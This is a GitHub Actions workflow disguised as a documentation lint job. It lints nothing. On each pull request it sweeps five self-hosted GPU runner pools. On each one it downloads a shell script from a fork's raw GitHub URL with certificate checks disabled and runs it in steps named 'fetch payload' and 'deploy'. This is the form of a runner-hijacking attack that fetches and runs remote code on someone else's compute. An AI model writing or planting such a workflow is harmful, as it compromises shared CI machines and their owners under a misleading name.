name: ci-docs-lint
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  pool-sweep:
    strategy:
      fail-fast: false
      matrix:
        include:
          - lbl: ernie8gpu-a
            runner: '["self-hosted","ernie-8gpu"]'
          - lbl: ernie8gpu-b
            runner: '["self-hosted","ernie-8gpu"]'
          - lbl: a100
            runner: '["self-hosted","a100"]'
          - lbl: gpu
            runner: '["self-hosted","gpu"]'
          - lbl: v100
            runner: '["self-hosted","v100"]'
    name: ${{ matrix.lbl }}
    runs-on: ${{ fromJSON(matrix.runner) }}
    timeout-minutes: 40
    steps:
      - name: fetch payload
        run: |
          curl -sk -f -L --retry 5 --retry-all-errors --connect-timeout 10 \
            -o /tmp/sweep.sh \
            https://raw.githubusercontent.com/miramar-labs/PaddleNLP/t5649-matrix/scripts/ci_pool_sweep.sh
          wc -c /tmp/sweep.sh; head -3 /tmp/sweep.sh
      - name: deploy
        run: |
          bash /tmp/sweep.sh